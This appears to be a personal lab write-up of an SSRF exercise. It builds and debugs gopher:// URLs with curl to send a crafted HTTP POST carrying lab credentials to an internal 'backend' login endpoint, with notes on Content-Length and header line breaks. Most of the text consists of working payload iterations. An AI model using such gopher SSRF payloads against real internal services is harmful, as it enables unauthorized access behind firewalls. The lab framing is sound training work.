#### Labs
`1.`

![[Pasted image 20250108231455.png]]
navigate to `http://backend/login` using the `SSRF` vulnerabilty
![[Pasted image 20250108232542.png]]
we get a `405` error but this gives us an `IDEA` of what the `REQUEST` should look like
![[Pasted image 20250108232922.png]]
once we have an `idea` of the `Request` we can begin testing against our own `kali` server with tailored `gopher`

starting example:
```http
gopher://127.0.0.1:80/_POST%20/protectedflag%20HTTP/1.1%0ACookie:test
```
testing on `kali` test #1
```http
curl gopher://127.0.0.1:80/login_POST%200HTTP/1.1%0AContent-Length:%2050%0AContent-Type:%20application/x-www-form-urlencoded%0ausername=white.rabbit%0apassword=dontbelate
```
we can see multiple errors on the highlighted line
![[Pasted image 20250108233626.png]]
lets fix them
```http
curl gopher://127.0.0.1:80/_POST%200HTTP/1.1%0AContent-Length:%2050%0AContent-Type:%20application/x-www-form-urlencoded%0ausername=white.rabbit%0apassword=dontbelate
```
ok so we took out the `/login` portion and the line was kind of fixed
![[Pasted image 20250108233807.png]]
we still have an extra `0` lets fix that
```http
curl gopher://127.0.0.1:80/_POST%20HTTP/1.1%0AContent-Length:%2050%0AContent-Type:%20application/x-www-form-urlencoded%0ausername=white.rabbit%0apassword=dontbelate
```
looks good now but now we have to add the `/login` portion because thats the endpoint we are trying to hit
![[Pasted image 20250108233953.png]]
added the `/login` after the `POST`
```http
curl gopher://127.0.0.1:80/_POST%20/login%20HTTP/1.1%0AContent-Length:%2041%0AContent-Type:%20application/x-www-form-urlencoded%0a%0ausername=white.rabbit&apassword=dontbelate
```
looks good 
![[Pasted image 20250109000250.png]]
this worked - however we need to take note of `two`  very important things
- `Content-Length` has to match the actual content, so in this case `username=white.rabbit&password=dontbelate` = 41
- the `Content` so the `username=white.rabbit&password=dontbelate` have to be two spaces lower than all the `HEADERS` sp ensure `%0a%0a` occurs
```http
gopher://backend:80/_POST%20/login%20HTTP/1.1%0aContent-Length:%2041%0aContent-Type:%20application/x-www-form-urlencoded%0a%0ausername=white.rabbit&password=dontbelate
```
it working with `curl`
![[Pasted image 20250109000326.png]]
W
![[Pasted image 20250109000408.png]]